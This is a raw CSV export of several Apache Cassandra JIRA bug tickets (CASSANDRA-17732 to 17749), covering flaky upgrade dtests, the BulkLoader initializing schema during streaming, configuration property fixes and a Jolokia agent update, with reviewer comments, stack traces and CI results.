Unexpected error found in node logs (see stdout for full details). Errors: [[node2] ""ERROR [ScheduledTasks:1] 2022-07-11 22:53:45,982 ResourceWatcher.java:64 - Timed run of class org.apache.cassandra.locator.PropertyFileSnitch$1 failed.\norg.apache.cassandra.exceptions.ConfigurationException: Snitch definitions at cassandra-topology.properties do not define a location for this node's broadcast address /127.0.0.2:7000, nor does it provides a default\n\tat org.apache.cassandra.locator.PropertyFileSnitch.reloadConfiguration(PropertyFileSnitch.java:191)\n\tat org.apache.cassandra.locator.PropertyFileSnitch$1.runMayThrow(PropertyFileSnitch.java:78)\n\tat org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)\n\tat org.apache.cassandra.utils.ResourceWatcher$WatchedResource.run(ResourceWatcher.java:57)\n\tat org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)\n\tat java.util.concurrent.FutureTask.runAndReset(FutureTask.java:308)\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:180)\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:294)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:748)""]",,adelapena,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jul 15 13:12:19 UTC 2022,,,,,,,All,,,,"0|z16t0o:",9223372036854775807,,,,adelapena,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/18dccd68438eb3b777ef246afb24ff3089c642e7,,,,,,,,,run CI,,,,,"14/Jul/22 15:06;brandon.williams;I haven't been able to reproduce this because I believe it is very sensitive to timing.  We are forcing an update of the topology files [here|https://github.com/apache/cassandra-dtest/blob/trunk/upgrade_tests/upgrade_through_versions_test.py#L511] but this is being written in place.  If the timer task in the ResourceWatcher for PropertyFileSnitch fires while this happens, it may read an empty file, causing this error.  But this isn't a problem other than the log entry, since the file will be read again with the correct information after it is written.  [Patch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17749] to suppress the log, with [100 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/544/workflows/954fcba1-be3a-47b5-8156-a1ce50afa4b4/jobs/6514].;;;","14/Jul/22 16:10;adelapena;The repeated run workers are finishing almost instantly with a {{Repeated dtest name hasn't been defined, exiting without running any test}} message. I think you have to run the {{repeated_upgrade_dtest}} job, but {{j11_repeated_dtest}} was run instead. That job is only available in the workflow for j8 builds.

The repeated test jobs should probably fail on empty properties instead of succeed reporting the empty property. Otherwise, the only clue is the abnormally quick execution time. I'd try to fix that in another ticket.

Also, the value of {{REPEATED_UPGRADE_DTEST_NAME}} should be:
{code:java}
upgrade_tests/upgrade_through_versions_test.py::TestUpgrade_indev_4_0_x_To_indev_4_1_x::test_bootstrap_multidc
{code}
Instead of
{code:java}
upgrade_tests/upgrade_through_versions_test::TestUpgrade_indev_4_0_x_To_indev_4_1_x::test_bootstrap_multidc
{code}
I think the {{.py}} part on the file name is needed.;;;","14/Jul/22 16:33;brandon.williams;Oops, thanks for catching that.  I've started a proper run [here|https://app.circleci.com/pipelines/github/driftx/cassandra/546/workflows/c6b170e2-d90f-4714-9c74-a02575cf20d8/jobs/6516].;;;","15/Jul/22 13:04;adelapena;Suppressing the log message looks good to me, +1. I haven't been able to reproduce the failure on the unpatched branch either, at least [not with CircleCI|https://app.circleci.com/pipelines/github/adelapena/cassandra/1931/workflows/9066180e-a212-4073-8906-ebc406c0bea4].;;;","15/Jul/22 13:12;brandon.williams;bq.  I haven't been able to reproduce the failure

This isn't too surprising if my theory on the timer coinciding is correct.  Thanks for the assist and the review! Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
flaky dtest-upgrade.upgrade_tests.compatibility_flag_test.TestCompatibilityFlag.test__compatibility_flag_on_3014,CASSANDRA-17747,13471164,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,12/Jul/22 08:29,07/Mar/23 10:38,13/Jul/23 08:40,14/Jul/22 05:12,4.1-beta1,5.0,,,,,Test/dtest/python,,,,0,,"I noticed while working on other ticket the following failure

{noformat}
Regression

dtest-upgrade.upgrade_tests.compatibility_flag_test.TestCompatibilityFlag.test__compatibility_flag_on_3014 (from Cassandra dtests)
Failing for the past 1 build (Since
#1822 )
Took 29 sec.
Error Message

AssertionError: Expected {'0eff4047039accb22e83e048f45faaf497f7dbeeb9b7b263ee57e80115c15f20': ['1', '2', '3'], '4e4f0c52c483f4ebca82d4784c569a2e88cc89d417b1106d3166d8dade6a6dc5': ['2', '3', '4'], 'a5d7d00fe13de614673feb05b0f423da60659f481a4248a8f86a63f4ad82da1c': ['3', '4', '5'], '3a177d1a82c9b49287f02e567526347993d756c84ed6a2d4571b901b17a21e72': ['4', '5', '6'], '8aa7cf7ad64690bd7053ffff36b8d5b430b27193b0d163e26c4c427550e6ca54': ['5', '6', '7']} from SELECT * FROM test.test, but got {'3a177d1a82c9b49287f02e567526347993d756c84ed6a2d4571b901b17a21e72': ['4', '5', '6'], 'a5d7d00fe13de614673feb05b0f423da60659f481a4248a8f86a63f4ad82da1c': ['3', '4', '5'], '4e4f0c52c483f4ebca82d4784c569a2e88cc89d417b1106d3166d8dade6a6dc5': ['2', '3', '4'], '0eff4047039accb22e83e048f45faaf497f7dbeeb9b7b263ee57e80115c15f20': ['1', '2', '3']}
{noformat}
",,bereng,,,,,,,,,,,,,,"bereng closed pull request #198: Test  compatibility flag on 3014 CASSANDRA-17747
URL: https://github.com/apache/cassandra-dtest/pull/198


;14/Jul/22 05:12;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 14 09:46:19 UTC 2022,,,,,,,All,,,,"0|z16si8:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra-dtest/commit/1c257293ba64e517b94240218bb64b80e9b52b2b,,,,,,,,,See PR,,,,,"12/Jul/22 09:37;brandon.williams;No CI?;;;","13/Jul/22 05:02;bereng;I always put it in the PR.;;;","13/Jul/22 07:46;bereng;Happened again here https://ci-cassandra.apache.org/job/Cassandra-4.1/95/testReport/junit/dtest-upgrade.upgrade_tests.compatibility_flag_test/TestCompatibilityFlag/test__compatibility_flag_off_3014/;;;","13/Jul/22 13:46;brandon.williams;bq. I always put it in the PR.

Doh, I thought I checked.  +1;;;","14/Jul/22 09:46;bereng;Thanks a lot for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BulkLoader tool initializes schema unnecessarily via streaming,CASSANDRA-17740,13470389,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,06/Jul/22 16:26,29/Mar/23 20:49,13/Jul/23 08:40,05/Aug/22 20:51,4.1-beta1,5.0,,,,,Tool/bulk load,,,,0,,"Changes to streaming setup code for CASSANDRA-17663 mean that {{BulkLoader}} initializes the schema/system keyspace, which is not what we want in a tool. Initialization is due to a call to {{SystemKeyspace.getPreferredIP}} from the {{BulkLoader}} when it starts to transmit the SSTables from the bulk loader to the Cassandra instance.

{noformat}
getPreferredIP:1063, SystemKeyspace (org.apache.cassandra.db)
sendMessage:213, StreamingMultiplexedChannel (org.apache.cassandra.streaming.async)
sendControlMessage:191, StreamingMultiplexedChannel (org.apache.cassandra.streaming.async)
sendControlMessage:1033, StreamSession (org.apache.cassandra.streaming)
startStreamingFiles:1257, StreamSession (org.apache.cassandra.streaming)
prepareSynAck:802, StreamSession (org.apache.cassandra.streaming)
messageReceived:622, StreamSession (org.apache.cassandra.streaming)
run:76, StreamDeserializingTask (org.apache.cassandra.streaming)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:748, Thread (java.lang)
{noformat}

The existing {{BulkLoaderTest}} fails to detect this as it doesn't actually connect to anything so does not initialize streaming.

Affects 4.1 and trunk, and may affect 4.0, although the 4.0 patch for CASSANDRA-17663 is different than 4.1+, and may require different mitigation.",,jonmeredith,maedhroz,yijunm_ts,,,,,,,,,,,,"maedhroz commented on PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#issuecomment-1206024099

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17740-4.1


;05/Aug/22 04:17;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938427747


##########
test/unit/org/apache/cassandra/tools/ToolRunner.java:
##########
@@ -402,8 +400,11 @@ public Exception getException()
          */
         public void assertCleanStdErr()
         {
-            assertTrue(""Failed because cleaned stdErr wasn't empty: "" + getCleanedStderr(),
-                       getCleanedStderr().isEmpty());
+            String raw = getStderr();
+            String cleaned = getCleanedStderr();
+            assertTrue(""Failed to clean stderr completely.\nRaw (length="" + raw.length() + ""):\n"" + raw + 
+                       ""\nCleaned (length="" + cleaned.length() + ""):\n"" + cleaned,
+                       cleaned.trim().isEmpty());

Review Comment:
   Not strictly necessary for the fix, but it makes clean stderr issues easier to debug.



;05/Aug/22 04:19;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938431453


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -70,4 +70,9 @@ private NettyStreamingChannel create(OutboundConnectionSettings template, int me
 

Review Comment:
   If a `connectTo` is always set in this last `create()` overload, the comment in the second `create()` is incorrect, given the preferred address is always overridden. From an API perspective, the `preferred` address is completely ignored, and the second `create()` overload is useless, and we could just remove it. (The `Factory` interface has a default method that ignores `preferred`.)



;05/Aug/22 04:29;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938436721


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -70,4 +70,9 @@ private NettyStreamingChannel create(OutboundConnectionSettings template, int me
 

Review Comment:
   ...and just for the curious, I think we can't try to make this compatible w/ `EC2Snitch` either, given the whole point of this issue is that getting the preferred IP from the system keyspace is a no-no.



;05/Aug/22 04:44;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938431453


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -70,4 +70,9 @@ private NettyStreamingChannel create(OutboundConnectionSettings template, int me
 

Review Comment:
   If a `connectTo` is always set in this last `create()` overload, the comment in the second `create()` is incorrect, given the preferred address is always overridden. From an API perspective, the `preferred` address is completely ignored, and the second `create()` overload is useless, and we could just remove it. (The `Factory` interface has a default method that ignores `preferred`.)



;05/Aug/22 04:46;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938438411


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -70,4 +70,9 @@ private NettyStreamingChannel create(OutboundConnectionSettings template, int me
 

Review Comment:
   The comment in the second `create()` method is incorrect now. The preferred address is always ignored, not just ignored when encryption is enabled. The only reason that overload exists is so we don't call the `NettyStreamingConnectionFactory` implementation.



;05/Aug/22 04:49;githubbot;600","maedhroz commented on code in PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#discussion_r938438411


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -70,4 +70,9 @@ private NettyStreamingChannel create(OutboundConnectionSettings template, int me
 

Review Comment:
   The comment in the second `create()` method is incorrect now. The preferred address is always ignored, not just ignored when encryption is enabled. We can't make this compatible w/ `EC2Snitch` (using the preferred address), so the only reason that overload exists is so we don't call the `NettyStreamingConnectionFactory` implementation.



;05/Aug/22 04:50;githubbot;600","maedhroz opened a new pull request, #1772:
URL: https://github.com/apache/cassandra/pull/1772

   patch by Caleb Rackliffe; reviewed by Jon Meredith for CASSANDRA-17740
   
   Co-authored-by: Caleb Rackliffe <calebrackliffe@gmail.com>
   Co-authored-by: Jon Meredith <jmeredithco@gmail.com>


;05/Aug/22 17:32;githubbot;600","maedhroz commented on PR #1772:
URL: https://github.com/apache/cassandra/pull/1772#issuecomment-1206689129

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17740-trunk


;05/Aug/22 17:35;githubbot;600","maedhroz commented on PR #1772:
URL: https://github.com/apache/cassandra/pull/1772#issuecomment-1206853944

   Committed as https://github.com/apache/cassandra/commit/881b08f7015a4342833079e648e478526cc3b31a


;05/Aug/22 20:50;githubbot;600","maedhroz closed pull request #1772: CASSANDRA-17740 Avoid initializing schema via SystemKeyspace.getPreferredIP() with the BulkLoader tool (trunk)
URL: https://github.com/apache/cassandra/pull/1772


;05/Aug/22 20:50;githubbot;600","maedhroz commented on PR #1769:
URL: https://github.com/apache/cassandra/pull/1769#issuecomment-1206854181

   Committed as https://github.com/apache/cassandra/commit/5e39c54678b0d70145b5c699593eb9ce7fa7706a


;05/Aug/22 20:50;githubbot;600","maedhroz closed pull request #1769: CASSANDRA-17740 Avoid initializing schema via SystemKeyspace.getPreferredIP() with the BulkLoader tool (4.1)
URL: https://github.com/apache/cassandra/pull/1769


;05/Aug/22 20:50;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7800,,,0,7800,,,,,,,,,,,,,,,CASSANDRA-17663,,,,,,,,,,,,CASSANDRA-18370,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 28 06:15:15 UTC 2023,,,,,,,All,,,,"0|z16nqg:",9223372036854775807,,,,jmeredithco,,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/5e39c54678b0d70145b5c699593eb9ce7fa7706a,,,,,,,,,Make sure existing tests aren't disturbed.,,,,,"05/Aug/22 04:30;maedhroz;|branch|tests|
|[4.1|https://github.com/apache/cassandra/pull/1769]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17740-4.1]|
|[trunk|https://github.com/apache/cassandra/pull/1772]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17740-trunk]|

UPDATE: J8 upgrade tests will be fine after we get a fix for the checkstyle violations from CASSANDRA-17777.;;;","05/Aug/22 16:30;jonmeredith;+1;;;","05/Aug/22 19:50;maedhroz;Tests look green, w/ the exception of existing issues, like CASSANDRA-17573 and CASSANDRA-17804.;;;","05/Aug/22 20:51;maedhroz;4.1 - [https://github.com/apache/cassandra/commit/5e39c54678b0d70145b5c699593eb9ce7fa7706a]

trunk - https://github.com/apache/cassandra/commit/881b08f7015a4342833079e648e478526cc3b31a;;;","24/Mar/23 01:19;yijunm_ts;Hi [~maedhroz], is there a plan to backport the fix to 4.0 branch? We are hitting this issue w/ 4.0.7. Thanks.;;;","24/Mar/23 14:53;maedhroz;Hi [~yijunm_ts]. Do you mind creating a new Jira and assigning it to me? I can take a look at it, but the 4.0 mitigation might look a little different than the 4.1/trunk patch.;;;","28/Mar/23 06:15;yijunm_ts;[~maedhroz] Filed CASSANDRA-18370 and assigned it to you. TIA.

Yes, we took a look at the 4.1/trunk patch and realized that it is not that straightforward to bring it to 4.0 branch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix issues with index_summary_resize_interval and index_summary_capacity,CASSANDRA-17735,13470375,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Low,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,06/Jul/22 14:59,05/Oct/22 22:22,13/Jul/23 08:40,22/Jul/22 13:55,4.0.6,4.1,4.1-beta1,,,,Local/Config,,,,0,,"There are a few problems:

4.0+:
 * the virtual table displays only the cassandra.yaml values for both properties, all changes after startup are not updated

4.1+:
 *  Breaking compatibility - -1 was considered disabled, this should be considered as null now for the new config. The converter should be updated. There is a test for the -1, disable but it didn't caught the issue because of the previous issue mentioned (the disconnect between jmx and the actual property in Config class)",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17734,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Degradation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jul 22 13:54:34 UTC 2022,,,,,,,All,,,,"0|z16nnc:",9223372036854775807,,,,adelapena,,,,Low,,,,https://github.com/apache/cassandra/commit/860ec627a14068f5180c44b7cf47dd264978a328,,,,,,,,,"The current tests pass
 
||Patch||CI run||
|[4.0|https://github.com/apache/cassandra/pull/1735]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-4.0]|
|[4.1|https://github.com/apache/cassandra/pull/1736]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-4.1]|
|[trunk|https://github.com/apache/cassandra/pull/1737]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-trunk]|

Only failures are port not available for Jolokia and paxosRepairVersionGate(CASSANDRA-17573)",,,,,"18/Jul/22 21:05;e.dimitrova; 
||Patch||CI run||
|[4.0|https://github.com/apache/cassandra/pull/1735]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-4.0]|
|[4.1|https://github.com/apache/cassandra/pull/1736]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-4.1]|
|[trunk|https://github.com/apache/cassandra/pull/1737]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17735-trunk]|

Only failures are port not available for Jolokia and paxosRepairVersionGate(CASSANDRA-17573)

[~adelapena] do you mind to review?

 ;;;","19/Jul/22 10:54;adelapena;Sure, I'll take a look.;;;","19/Jul/22 12:13;adelapena;Looks good, I have dropped a couple of suggestions on the PR for trunk.;;;","21/Jul/22 21:53;e.dimitrova;Thanks [~adelapena] , I just rebased, applied the suggestions, updated also the changed Converter unit test and pushed to the PRs, CI running (last runs in the pipeline). I don't expect surprises from CI but let's see when it finishes, will keep an eye on it. ;;;","22/Jul/22 02:45;e.dimitrova;It seems there were some environmental issues - I just resubmitted the 4.1 [upgrade tests|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1793/workflows/951fd90a-618d-4156-91d1-559cb144d6cb], also one of the [cqlsh jobs|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1793/workflows/8e7db3b0-f847-428e-91df-eca838d09185/jobs/13345]
The rest seems like known issues.It is interesting I see second time the simulator tests, one failing. I will open a ticket for that one but it is not related to this patch;;;","22/Jul/22 10:41;adelapena;Looks good to me, +1;;;","22/Jul/22 13:54;e.dimitrova;Committed, thanks!
c5747547fa..860ec627a1  cassandra-4.0 -> cassandra-4.0
   b4e58d83fc..9beeaf87bd  cassandra-4.1 -> cassandra-4.1
   ab9ab903fa..66177be587  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
min_tracked_partition_size_bytes should not have the unit suffix,CASSANDRA-17733,13470360,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,06/Jul/22 13:56,05/Oct/22 22:22,13/Jul/23 08:40,15/Jul/22 16:52,4.1,4.1-beta1,,,,,Local/Config,,,,0,,"min_tracked_partition_size_bytes was added in CASSANDRA-16310. It should have not been added with the unit suffix anymore as confirmed on the commit.

It is also confusing now when users can add unit of their choice. 

We have two options:
 * keep it with annotation and add also version without the suffix
 * rename it as we are still alpha and API changes can be done for bug fixing. Not sure whether we need an approval on the ML for this one.

CC [~ycai] , [~marcuse] and [~dcapwell] ",,bereng,e.dimitrova,jmckenzie,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16310,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 20 16:29:47 UTC 2022,,,,,,,All,,,,"0|z16nk0:",9223372036854775807,,,,bereng,blerer,,,Low,,4.1-alpha1,,https://github.com/apache/cassandra/commit/46d9cbe2f66b02cedf1b7961c4c1194488e1323b,,,,,,,,,"[4.1 branch|https://github.com/ekaterinadimitrova2/cassandra/tree/17733-4.1]. - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17733-4.1&filter=all]

[trunk branch|https://github.com/ekaterinadimitrova2/cassandra/tree/17733-trunk] - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17733-trunk&filter=all]

No new tests needed",,,,,"06/Jul/22 14:00;marcuse;+1 on just renaming it, thanks for catching this;;;","10/Jul/22 23:52;e.dimitrova;Thank you [~marcuse] , I just went ahead and changed it as it was rather quick patch. Can you, please, review it?

I changed also the set/get methods' names in the DatabaseDescriptor to acknowledge that internally we operate the property in bytes.

Also, added NEWS.txt and CHANGES.txt entries.

[4.1 branch|https://github.com/ekaterinadimitrova2/cassandra/tree/17733-4.1]. - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17733-4.1&filter=all]

[trunk branch|https://github.com/ekaterinadimitrova2/cassandra/tree/17733-trunk] - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17733-trunk&filter=all];;;","11/Jul/22 08:40;bereng;Trunk j11 seems broken. It might be an env issue but worth a retry imo;;;","11/Jul/22 17:24;e.dimitrova;Yeah, seems like there was some OS error. 

I just resubmitted the J11 tests on trunk [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1773/workflows/8bde4acc-dbdd-4287-be48-3d5611122ca4/jobs/12887] , let's see. ;;;","11/Jul/22 18:15;e.dimitrova;Only one known failure.;;;","12/Jul/22 05:25;bereng;LGTM +1;;;","15/Jul/22 13:44;e.dimitrova;Thanks [~bereng] , I just rebased and pushed final CI run as it's been a few days. Pending commit on CI results;;;","15/Jul/22 16:32;e.dimitrova;1 known failure in trunk - CASSANDRA-17708

1 known failure in 4.1 - CASSANDRA-17732

Starting commit;;;","15/Jul/22 16:51;e.dimitrova;To https://github.com/apache/cassandra.git

   9bd32771e3..46d9cbe2f6  cassandra-4.1 -> cassandra-4.1

   889ca60edc..1c2cd30125  trunk -> trunk;;;","20/Jul/22 16:29;jmckenzie;No new failures that look related to this ticket.

 

[CI Results]
Branch: 4.1, build number: 103
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/103/]
JIRA: CASSANDRA-17733
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=46d9cbe2f66b02cedf1b7961c4c1194488e1323b]
affected paths:
 * test/distributed/org/apache/cassandra/distributed/test/TopPartitionsTest.java
 * NEWS.txt
 * src/java/org/apache/cassandra/service/StorageService.java
 * src/java/org/apache/cassandra/config/DatabaseDescriptor.java
 * CHANGES.txt
 * src/java/org/apache/cassandra/metrics/TopPartitionTracker.java
 * src/java/org/apache/cassandra/config/Config.java
 * test/unit/org/apache/cassandra/db/TopPartitionTrackerTest.java

Build Result: UNSTABLE
Passing Tests: 48020
Failing Tests: 8
||Test|Failures|JIRA|
|org.apache.cassandra.distributed.test.TopPartitionsTest.basicRowTombstonesTest[Incremental]|1 of 102|CASSANDRA-17649?|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-compression|12 of 102|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|16 of 102|CASSANDRA-17461?|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|12 of 102|CASSANDRA-17649?|
|dtest-large-novnode.materialized_views_test.TestMaterializedViews.test_throttled_partition_update|1 of 102|CASSANDRA-11612?|
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.TopPartitionsTest|2 of 102|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*test*%22]|
|dtest-novnode.cqlsh_tests.test_cqlsh.TestCqlsh.test_describe|1 of 102|CASSANDRA-17322?|
|org.apache.cassandra.distributed.test.NetstatsBootstrapWithEntireSSTablesCompressionStreamingTest.testWithStreamingEntireSSTablesWithoutCompressionWithoutThrottling|1 of 102|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Jolokia agent for Python DTests,CASSANDRA-17732,13470217,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,05/Jul/22 23:05,24/Nov/22 15:37,13/Jul/23 08:40,18/Jul/22 14:46,NA,,,,,,CI,,,,0,,"We started seeing Python DTest failures that point to Jolokia agent. 

In  [one|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/237/workflows/b9eb4a84-b30c-4fd5-9ca9-ea47f114eef0/jobs/1654/tests] of the latest J11 runs I noticed: 
{code:java}
stdout = b""WARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by org.jolokia.jvma...rt '8778' is already occupied.\nPlease check the standard output of the target process for a detailed error message.\n"" stderr = None, retcode = 1{code}
I checked Jolokia  [official page|https://jolokia.org/] and it seems they added the Java 11 support with 1.7 and we are on 1.6 yet.

